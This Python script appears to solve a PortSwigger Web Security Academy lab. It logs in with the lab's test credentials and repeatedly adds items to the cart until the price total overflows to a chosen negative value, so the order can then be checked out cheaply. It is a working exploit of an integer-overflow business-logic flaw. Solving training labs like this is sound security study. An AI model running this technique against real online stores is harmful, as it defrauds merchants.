import requests
import threading
import bs4
import pygame

DOMAIN = "0abe001704ad93ba81aa43810009001f.web-security-academy.net"

HEADERS = {
    "Host": DOMAIN,
    "Content-Type": "application/x-www-form-urlencoded",
    "Cookie": ""
}


def get_initial_session():
    response = requests.get(f"https://{DOMAIN}/login", headers=HEADERS)
    HEADERS["Cookie"] = "session=" + response.headers["Set-Cookie"].split("session=")[1].split(";")[0]  + ";"

def get_csrf_token_login():
    response = requests.get(f"https://{DOMAIN}/login", headers=HEADERS)
    csrf_token = response.text.split('csrf" value="')[1].split('"')[0]
    return csrf_token

def login():
    csrf_token = get_csrf_token_login()
    data = {
        "csrf": csrf_token,
        "username": "wiener",
        "password": "peter"
    }
    response = requests.post(f"https://{DOMAIN}/login", headers=HEADERS, data=data)

    if "Your username is" in response.text:
        print("Logged in successfully")
        print("COOKIES: ", response.request.headers["Cookie"])

    HEADERS["Cookie"] = response.request.headers["Cookie"]

def add_to_cart(id=1, quantity=1):
    url = f"https://{DOMAIN}/cart"
    data = {
        "productId": id,
        "quantity": quantity,
        "redir": "PRODUCT"
    }
    response = requests.post(url, headers=HEADERS, data=data, allow_redirects=False)

    # if response.status_code == 302:
    #     print(f"Added product {id} to cart")



def get_csrf_token_checkout():
    response = requests.get(f"https://{DOMAIN}/cart", headers=HEADERS)
    csrf_token = response.text.split('csrf" value="')[1].split('"')[0]
    return csrf_token

def get_cart():
    response = requests.get(f"https://{DOMAIN}/cart", headers=HEADERS)
    soup = bs4.BeautifulSoup(response.text, "html.parser")

    total = soup.find_all("th")
    
    for t in total:
        if "$" in t.text:
            print(t.text)
            if "-" in t.text:
                # if int(t.text.split("$")[1].split(".")[0]) == "-$62723.96":
                if t.text == "-$62723.96":
                    pygame.mixer.init()
                    pygame.mixer.music.load("./alarm-car-or-home-62554.mp3")
                    pygame.mixer.music.play()
                    return "Break"


def checkout():
    csrf_token = get_csrf_token_checkout()
    data = {
        "csrf": csrf_token
    }
    response = requests.post(f"https://{DOMAIN}/cart/checkout", headers=HEADERS, data=data, allow_redirects=False)

    print(response.text)
    if response.status_code == 303:
        print("Checked out successfully")


def exploit():
    get_initial_session()
    login()
    add_to_cart(1, 1)

    while True:
        add_to_cart(1, 99)
        if "Break" == get_cart():
            break


exploit() # loggin(manually) using cookie outputed, then wait for IndexError | than checkout manually
# $1337      32123 
# $85.25 	 15